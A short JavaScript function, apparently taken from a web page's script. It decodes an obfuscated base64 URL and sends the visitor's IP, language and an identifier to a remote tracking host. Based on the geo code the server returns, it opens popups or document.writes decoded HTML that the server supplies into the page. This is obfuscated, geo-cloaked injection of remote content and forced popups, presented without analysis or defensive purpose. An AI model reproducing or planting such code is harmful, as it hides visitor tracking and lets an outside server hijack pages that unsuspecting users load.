function budal(ip) {

    var gtx = cmx('aHR0cHM6Ly9pY2xpY2suY2x1Yi9qcy90cmFja19qc29uLnBocD91cz0') + porn + "&lg=" + lang + "&ip=" + ip + "&time" + Date.now();
    //console.log($getURL)
    $.get(gtx, function (data) {
        if (data.geo) {
            if (data.geo == 'ZZ') {
                window.open(cmx(data.pop), 'up');
            } else {
                if (data.geo == 'ID') {
                    $.ajax({
                            method: "GET",
                            url: cmx(data.usr),
                            data: {
                                    usr: porn,
                                    token: data.usr
                            }
                    }).done(function (msg) {
                                    console.log(msg);
                        document.write(cmx(msg.hd) + cmx(msg.mh) + cmx(msg.pg) + cmx(msg.mf));
                    });
                } else {
                    document.write(data.url);
                }
            }
        } else {
            window.open(cmx(data.pop), 'up');
        }
    });
}
